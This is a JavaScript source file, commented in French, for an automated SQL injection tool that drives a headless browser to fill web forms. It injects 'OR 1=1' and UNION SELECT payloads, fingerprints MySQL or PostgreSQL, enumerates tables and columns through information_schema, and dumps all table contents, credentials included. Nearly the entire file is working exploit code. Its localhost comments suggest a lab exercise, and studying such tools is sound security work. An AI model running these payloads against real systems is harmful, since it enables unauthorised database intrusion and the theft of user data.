import { saveInFile } from "../file.js";
import { dbGetColumns } from "./getMethod.js";

const payloads = [
  "' OR 1=1 --'",
  //http://localhost:3000/mysql/users/1%20UNION%20SELECT%20null,%20null,%20current_database()%20--
  //http://localhost:3000/mysql/users/1%20UNION%20SELECT%20null,%20null,%20database()%20--
  // "' UNION SELECT null, database() -- '", // mysql
  // "' UNION SELECT null, null, null, current_database() -- '", // postgresql
  // "' UNION SELECT null, null, null, user() -- '", // mysql
  // "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' -- '",
];

const extractData = (data) => {
  // console.log("data : ", data);
  let nbNull = 0;
  let tot = 0;
  let result;

  for (const prop in data) {
    tot++;
    if (data[prop] === null) {
      nbNull++;
    } else {
      result = data[prop];
    }
  }

  if (result && tot - nbNull === 1) return result;
};

const eraseInputById = async (id, page) => {
  const inputSelector = `#${id}`;
  await page.click(inputSelector);

  await page.keyboard.down("Control");
  await page.keyboard.press("A");
  await page.keyboard.up("Control");
  await page.keyboard.press("Backspace");
};

const formsFound = async (page) => {
  const ret = await page.evaluate(() => {
    const forms = document.querySelectorAll("form");

    if (forms.length === 0) {
      console.warn("Aucun formulaire trouvé sur la page.");
      return [];
    }

    return Array.from(forms).map((form) => ({
      inputs: Array.from(form.querySelectorAll("input, textarea"))
        .filter((f) => f.type !== "submit")
        .map((input) => ({
          name: input.name,
          type: input.type,
          value: input.value,
          id: input.id,
          class: input.className,
          classList: input.classList,
        })),
      buttons: Array.from(
        form.querySelectorAll('button[type="submit"], input[type="submit"]')
      ).map((button) => ({
        text: button.textContent,
        type: button.type,
        id: button.id,
        class: button.className,
        classList: button.classList,
      })),
      isVulnerable: false,
    }));
  });
  return ret;
};

const testPostVulnerabilite = async (page, forms, dbData) => {
  //ref retourn

  for (const [index, form] of Array.from(forms).entries()) {
    for (const input of form.inputs) {
      await eraseInputById(`${input.id}`, page);
      await page.type(`#${input.id}`, payloads[0]);
    }

    let serverResponse = new Promise((resolve, reject) => {
      page.on("response", (response) => {
        // if (response.url().includes("/api/mysql/auth/")) {
        resolve(response);
        // }
      });
    });

    await page.click('form button[type="submit"], form input[type="submit"]');

    const response = await serverResponse;
    const status = response.status();
    // console.log("Code de statut de la réponse:", status);

    const responseData = await response.json();
    console.log("Réponse du serveur:", responseData);

    if (((status / 100) | 0) === 2) {
      forms[index].isVulnerable = true;
      if (!dbData.payloadsUsed.includes(payloads[0]))
        dbData.payloadsUsed.push(payloads[0]);
    }
  }
};

const dataBasesEngines = {
  mysql: ["database()", "user()", "version()", "datadir()"],
  postgresql: ["current_database()", "current_user()", "pg_version()"],
  // sqlite: ["sqlite_version()"],
};

const getPostDbEngine = async (page, forms, dbData) => {
  for (const dataBaseEngine of Object.entries(dataBasesEngines)) {
    // console.log("dataBaseEngine", dataBaseEngine);

    const vulnForm = forms.find((f) => f.isVulnerable);

    // for (const form of forms) {
    for (let i = 0; i < 10; i++) {
      const payloadTestDbName =
        "' UNION SELECT " + "null, ".repeat(i) + dataBaseEngine[1][0] + " -- '";
      // console.log("payloadTestDbName", payloadTestDbName);

      for (const input of vulnForm.inputs) {
        await eraseInputById(`${input.id}`, page);
        await page.type(`#${input.id}`, payloadTestDbName);
      }

      let serverResponse = new Promise((resolve, reject) => {
        page.on("response", (response) => {
          // if (response.url().includes("/api/mysql/auth/")) {
          resolve(response);
          // }
        });
      });

      await page.click('form button[type="submit"], form input[type="submit"]');

      const response = await serverResponse;
      const status = response.status();
      // console.log("Code de statut de la réponse:", status);

      if (((status / 100) | 0) === 2) {
        const responseData = await response.json();
        // console.log("Réponse du serveur get engine :", responseData);
        for (const elem of Object.entries(responseData[0])) {
          if (elem[1] !== null) {
            dbData.dbName = elem[1];
            dbData.dbEngine = dataBaseEngine[0];
            dbData.nbColumns = i;
            dbData.vulnerableParameters.push({
              field: vulnForm.inputs[0].name,
            });
            dbData.payloadsUsed.push(payloadTestDbName);
            return;
          }
        }
      }
    }
    // }
  }
};

const dataBasesTables = {
  mysql:
    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = '",
  postgresql:
    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
};

const dbPostGetTables = async (page, forms, dbData) => {
  const dataBasesDumpsEngine = dataBasesTables[dbData.dbEngine];

  let payloadDbTable = dataBasesDumpsEngine.replace(
    "SELECT ",
    "SELECT " + "null, ".repeat(dbData.nbColumns)
  );

  if (dbData.dbEngine === "mysql") {
    payloadDbTable += dbData.dbName + "' -- ' ";
  }
  // console.log("payloadDbTable ", payloadDbTable);
  const vulnForm = forms.find((f) => f.isVulnerable);

  for (const input of vulnForm.inputs) {
    await eraseInputById(`${input.id}`, page);
    await page.type(`#${input.id}`, payloadDbTable);
  }

  let serverResponse = new Promise((resolve, reject) => {
    page.on("response", (response) => {
      // if (response.url().includes("/api/mysql/auth/")) {
      resolve(response);
      // }
    });
  });

  await page.click('form button[type="submit"], form input[type="submit"]');

  const response = await serverResponse;
  const status = response.status();
  // console.warn("Code de statut de la réponse:", status);

  const responseData = await response.json();
  // console.log("Réponse du serveur get tables :", responseData);

  if (((status / 100) | 0) === 2) {
    for (const elem of Object.entries(responseData)) {
      for (const e of Object.entries(elem[1])) {
        if (e[1] !== null && !dbData.table.includes(e[1])) {
          dbData.table.push(e[1]);
          if (!dbData.payloadsUsed.includes(payloadDbTable))
            dbData.payloadsUsed.push(payloadDbTable);
        }
      }
    }
  }
};

const dataBasesColumns = {
  mysql:
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = '",
  postgresql:
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = '",
};

const dbPostGetColumns = async (page, forms, dbData) => {
  const dataBasesDumpsEngine = dataBasesColumns[dbData.dbEngine];

  // for (const dataBaseColumn of Object.entries(dataBasesColumns)) {
  for (const table of dbData.table) {
    let payloadDbColumn = dataBasesDumpsEngine.replace(
      "SELECT ",
      "SELECT " + "null, ".repeat(dbData.nbColumns)
    );
    let columnsOfTable = {
      tableName: table,
      columns: [],
      data: [],
    };
    payloadDbColumn += table + "' -- '";
    // console.log("payloadTestDbColumns", payloadDbColumn);

    const vulnForm = forms.find((f) => f.isVulnerable);

    for (const input of vulnForm.inputs) {
      await eraseInputById(`${input.id}`, page);
      await page.type(`#${input.id}`, payloadDbColumn);
    }

    let serverResponse = new Promise((resolve, reject) => {
      page.on("response", (response) => {
        // if (response.url().includes("/api/mysql/auth/")) {
        resolve(response);
        // }
      });
    });

    await page.click('form button[type="submit"], form input[type="submit"]');

    const response = await serverResponse;
    const status = response.status();
    // console.log("Code de statut de la réponse:", status);

    const responseData = await response.json();
    // console.log("RES : ", responseData);

    if (((status / 100) | 0) === 2) {
      for (const elem of Object.entries(responseData)) {
        // console.log("COLUM : ", elem);
        for (const e of Object.entries(elem[1])) {
          if (e[1] !== null && !columnsOfTable.columns.includes(e[1])) {
            columnsOfTable.columns.push(e[1]);
            if (!dbData.payloadsUsed.includes(payloadDbColumn))
              dbData.payloadsUsed.push(payloadDbColumn);
          }
        }
      }
    }
    if (!dbData.columns.find((c) => c.tableName === table))
      dbData.columns.push(columnsOfTable);
  }
};

//"' UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description), null, null, null FROM users -- ",
const dataBasesDumps = {
  mysql: "' UNION SELECT CONCAT(concat), null FROM table -- ",
  postgresql: "' UNION SELECT CONCAT(concat), null FROM table -- ",
  // test: "' UNION SELECT null, concat(cast(id AS text), ', ', username, ', ', password, ', ', description), null, null FROM test_db -- ",
  // test: "' UNION SELECT 0 AS text, CAST(CONCAT(CAST(blabla AS text), ', ', CAST(id AS text), ', ', CAST(blibli AS text)) AS text) AS text FROM test_db -- '",
};

const dbPostDump = async (page, forms, dbData) => {
  const dataBasesDumpsEngine = dataBasesDumps[dbData.dbEngine];
  for (const table of dbData.table) {
    const allColumns = dbData.columns.find((c) => c.tableName === table);
    const totalColumns = dbData.nbColumns - 1;

    for (let i = 0; i <= totalColumns; i++) {
      let allColumnsConcat = "";
      for (const column of allColumns.columns) {
        let tmp = column;
        if (dbData.dbEngine === "postgresql")
          tmp = "CAST(" + column + " AS text)";
        allColumnsConcat += tmp + ", ', ', ";
      }
      allColumnsConcat = allColumnsConcat.slice(0, -8);
      // console.log("truc milieu : ", allColumnsConcat);

      // console.log("db dump engine : ", dataBasesDumpsEngine);
      // let payloadDbDump = dataBasesDumpsEngine
      //   .replace(", null ", ", null ".repeat(dbData.nbColumns))
      //   .replace("table", table)
      //   .replace("concat", allColumnsConcat);

      let payloadDbDump = dataBasesDumpsEngine
        .replace("CONCAT(concat), null", () => {
          const truc = "CONCAT(" + allColumnsConcat + ")";
          const result =
            "null, ".repeat(i) +
            truc +
            ", ".repeat(i == totalColumns - 1 ? 0 : 1) +
            "null, ".repeat(Math.max(0, totalColumns - i - 2)) +
            "null".repeat(i == totalColumns - 1 ? 0 : 1);
          return result;
          // const test = "CONCAT(" + allColumnsConcat + "), null";
        })
        .replace("table", table);

      // payloadDbDump = dataBasesDump[1] + table + "' -- '";
      // console.log("payload\n", payloadDbDump, "\n\n");
      // console.log("payload TEST : ", dataBasesDumps.test);

      const vulnForm = forms.find((f) => f.isVulnerable);

      // for (const form of forms) {
      for (const input of vulnForm.inputs) {
        await eraseInputById(`${input.id}`, page);
        await page.type(`#${input.id}`, payloadDbDump);
      }

      let serverResponse = new Promise((resolve, reject) => {
        page.on("response", (response) => {
          // if (response.url().includes("/api/mysql/auth/")) {
          resolve(response);
          // }
        });
      });

      await page.click('form button[type="submit"], form input[type="submit"]');

      const response = await serverResponse;
      const status = response.status();
      // console.log("Code de statut de la réponse:", status);

      const responseData = await response.json();
      // console.log("Réponse du serveur get tables :", responseData);

      if (status !== 500)
        for (const elem of responseData) {
          // console.log("elem", elem);

          for (const e of Object.entries(elem)) {
            // console.log("e", e[1]);

            const tmp = dbData.columns.find((t) => t.tableName === table).data;

            if (e[1] != null && !tmp.includes(e[1])) {
              tmp.push(e[1]);
              if (!dbData.payloadsUsed.includes(payloadDbDump))
                dbData.payloadsUsed.push(payloadDbDump);
            }
          }

          // dbData.columns.data.push(elem[firstColumn]);
        }
      // }
    }
  }
};

export {
  testPostVulnerabilite,
  getPostDbEngine,
  dbPostGetTables,
  dbPostGetColumns,
  formsFound,
  dbPostDump,
};
